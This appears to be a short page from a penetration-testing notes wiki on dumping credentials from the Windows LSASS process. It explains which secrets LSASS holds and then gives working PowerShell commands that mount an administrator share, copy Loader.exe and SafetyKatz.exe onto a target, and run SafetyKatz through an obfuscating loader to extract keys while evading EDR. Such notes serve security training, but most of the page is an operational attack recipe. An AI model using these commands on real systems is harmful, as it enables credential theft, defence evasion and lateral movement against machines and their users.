# LSASS

When a user authenticates to a server, their credentials may be stored in the memory of the LSASS process. This process holds the following types of credentials:

* NT hashes,
* Kerberos tickets (TGT & ST),
* WDigest password in cleartext
* DPAPI cached keys.

When a user gets administrative privileges on a machine, they can dump the memory of the LSASS process to retrieve credentials that it stores. EDR will block this operation so they need to be bypassed.



## Dump secrets with SafetyKatz

To obfuscate the launch of the tool, use CRTE's loader. First upload Loader.exe and SafetyKatz.exe to the machine, for instance with mounting a network share:

```powershell
> net use x: \\us-mailmgmt\C$\Users\Public /user:us-mailmgmt\Administrator <password>
> echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
> echo F | xcopy C:\AD\Tools\SafetyKatz.exe x:\SafetyKatz.exe
```

Then, connect to the server, for instance with winrs ([#winrs](../misc/ad-authentication.md#winrs "mention")) and run it:

```powershell
> .\Loader.exe -Path .\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

